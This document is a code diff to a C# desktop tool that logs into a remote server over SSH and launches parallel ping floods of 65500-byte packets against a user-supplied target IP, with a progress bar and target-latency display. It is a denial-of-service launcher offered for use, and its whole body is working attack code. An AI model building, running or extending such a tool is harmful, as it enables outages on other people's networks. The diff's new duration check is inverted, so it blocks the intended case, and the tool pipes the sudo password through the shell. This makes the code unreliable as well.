@@ -10,22 +10,23 @@ using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Timer = System.Windows.Forms.Timer;
 
 namespace OFFINERY
 {
     public partial class mainForm : Form
     {
         public bool isHitting = false;
-        Ping pingSender = new Ping();
         public mainForm()
         {
             InitializeComponent();
             InitTimer();
             if (File.Exists("config.json"))
             {
-                string text = System.IO.File.ReadAllText("config.json");
+                string text = File.ReadAllText("config.json");
                 serverinfo s = JsonConvert.DeserializeObject<serverinfo>(text);
                 serveripBox.Text = s.IP;
                 usernameBox.Text = s.User;
@@ -63,30 +64,50 @@ namespace OFFINERY
             if (isHitting)
             {
                 curTime += 1;
+                progress.Value = curTime;
                 if (curTime >= durationBox.Value)
                 {
                     attackButton.Enabled = true;
                     isHitting = false;
-                    Success f2 = new Success();
-                    f2.Show();
+                    MessageBox.Show("Packet Barrage Complete!");
+                    curlatency.Text = "Target Latency: None";
+                    curtarget.Text = "Current Target: None";
+                    progress.Value = 0;
+                }
+                else
+                {
+                    curlatency.Text = "Target Latency: " + GetPing(targetipBox.Text);
                 }
             }
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            attackButton.Enabled = false;
-            isHitting = true;
-            string command = "";
-            for (int i = 0; i < powerBox.Value; i++)
+            if (!(durationBox.Value >= 1))
             {
-                command += string.Format("echo {0} | sudo -S timeout {1} ping -f -s 65500 -l 3 {2} &", passwordBox.Text, durationBox.Value, targetipBox.Text);
-            }
-            using (var client = new SshClient(serveripBox.Text, usernameBox.Text, passwordBox.Text))
+                curtarget.Text = "Current Target: " + targetipBox.Text;
+                progress.Value = 0;
+                progress.Maximum = (int)durationBox.Value;
+                attackButton.Enabled = false;
+                isHitting = true;
+                string command = "";
+                for (int i = 0; i < powerBox.Value; i++)
+                {
+                    command += string.Format("echo {0} | sudo -S timeout {1} ping -f -s 65500 -l 3 {2} &", passwordBox.Text, durationBox.Value, targetipBox.Text);
+                }
+                new Thread(() =>
+                {
+                    using (var client = new SshClient(serveripBox.Text, usernameBox.Text, passwordBox.Text))
+                    {
+                        client.Connect();
+                        client.RunCommand(command);
+                        client.Disconnect();
+                    }
+                }
+                ).Start();
+            } else
             {
-                client.Connect();
-                client.RunCommand(command);
-                client.Disconnect();
+                MessageBox.Show("Please set duration greater then 1!");
             }
         }
 
@@ -117,6 +138,29 @@ namespace OFFINERY
         private void groupBox5_Enter(object sender, EventArgs e)
         {
 
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        public static string GetPing(string address)
+        {
+            try
+            {
+                Ping myPing = new Ping();
+                PingReply reply = myPing.Send(address);
+                if (reply != null)
+                {
+                    return reply.RoundtripTime.ToString() + "ms";
+                }
+            }
+            catch
+            {
+                return "Timed Out";
+            }
+            return null;
         }
     }
 }
